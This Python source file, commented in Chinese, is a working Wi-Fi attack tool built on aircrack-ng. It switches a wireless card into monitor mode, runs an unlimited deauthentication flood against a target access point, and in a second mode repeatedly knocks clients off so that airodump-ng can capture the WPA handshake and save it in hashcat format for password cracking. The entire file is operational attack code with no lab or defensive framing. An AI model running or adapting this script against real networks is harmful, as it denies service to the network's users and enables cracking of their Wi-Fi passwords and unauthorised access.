import argparse
import subprocess
import time
import os
import sys
import shutil
import signal

# 修复环境变量
os.environ["PATH"] += os.pathsep + "/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"


def run_cmd(cmd):
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def log(msg):
    print(f"[Attack] {msg}")
    sys.stdout.flush()


def setup_monitor(interface, channel):
    print(f"[INFO] 配置网卡 {interface} -> 监听模式 (CH:{channel})...")

    # 清理环境
    run_cmd("killall wpa_supplicant NetworkManager dhclient airodump-ng aireplay-ng")
    run_cmd("iw reg set US")  # 解锁 5G

    # 重置网卡
    run_cmd(f"ip link set {interface} down")
    run_cmd(f"iw dev {interface} set type monitor")
    run_cmd(f"ip link set {interface} up")

    # 强力锁频
    for _ in range(3):
        run_cmd(f"iw dev {interface} set channel {channel}")
        time.sleep(0.2)


def attack_deauth(bssid, interface, channel, duration):
    """Deauth 洪水攻击 (双子星模式用)"""
    run_cmd(f"iw dev {interface} set channel {channel}")
    print(f"[INFO] 启动 Deauth 攻击: {bssid} (CH:{channel})")

    # -D: 禁用AP检测(强制)
    cmd = ["aireplay-ng", "--ignore-negative-one", "-D", "-0", "0", "-a", bssid, interface]

    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    start_time = time.time()

    try:
        while True:
            if duration > 0 and (time.time() - start_time) > duration: break
            line = proc.stdout.readline()
            if not line and proc.poll() is not None: break

            if line:
                line = line.strip()
                if "Sending" in line and "DeAuth" in line:
                    print(f"[LOG] ⚡ 正在发送 Deauth 攻击包...")
                elif "Waiting for beacon" in line:
                    run_cmd(f"iw dev {interface} set channel {channel}")
                    print(f"[WARN] 信号丢失，正在校准信道...")
            sys.stdout.flush()
    except KeyboardInterrupt:
        pass
    finally:
        proc.terminate()
        run_cmd("killall aireplay-ng")


def capture_handshake(bssid, interface, channel, duration):
    """握手包捕获逻辑 (独立功能)"""
    prefix = f"/tmp/handshake_{bssid.replace(':', '')}"
    run_cmd("rm -f /tmp/handshake_*")  # 清理旧文件

    # 1. 再次锁频
    run_cmd(f"iw dev {interface} set channel {channel}")

    # 2. 启动 Airodump 抓包 (后台)
    print(f"[INFO] 启动抓包进程 (airodump-ng)...")
    # 输出 cap 和 hc22000 (Hashcat格式)
    dump_cmd = f"airodump-ng --bssid {bssid} --channel {channel} --write {prefix} --output-format cap,hc22000 {interface}"
    dump_proc = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # 3. 循环攻击诱骗重连
    start_time = time.time()
    print(f"[INFO] 开始诱骗用户重连 (Deauth)...")

    try:
        while (time.time() - start_time) < duration:
            # 每隔 8 秒发送一波攻击 (5个包)
            run_cmd(f"aireplay-ng --ignore-negative-one -D -0 5 -a {bssid} {interface}")
            time.sleep(8)

            # 检查是否已抓到包 (利用 aircrack-ng 检查 cap 文件)
            cap_file = f"{prefix}-01.cap"
            if os.path.exists(cap_file):
                # 检查命令: aircrack-ng <file>
                # 如果输出包含 "1 handshake"，说明抓到了
                check_res = subprocess.run(f"aircrack-ng {cap_file}", shell=True, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE, text=True)
                if "1 handshake" in check_res.stdout or "WPA (" in check_res.stdout:
                    print("\n[SUCCESS] CAPTURED_HS_POTENTIAL")  # 后端识别关键词
                    print("[INFO] 握手包捕获成功！")
                    break
    except Exception as e:
        print(f"[ERROR] {e}")
    finally:
        dump_proc.terminate()
        run_cmd("killall airodump-ng aireplay-ng")

        # 再次确认文件生成
        if os.path.exists(f"{prefix}.hc22000"):
            print("[INFO] Hash file generated.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("mode")
    parser.add_argument("--bssid", required=True)
    parser.add_argument("--interface", default="wlan0")
    parser.add_argument("--channel", default="1")
    parser.add_argument("--duration", default="60")
    args = parser.parse_args()

    setup_monitor(args.interface, args.channel)

    if args.mode == "deauth":
        attack_deauth(args.bssid, args.interface, args.channel, int(args.duration))
    elif args.mode == "handshake":
        capture_handshake(args.bssid, args.interface, args.channel, int(args.duration))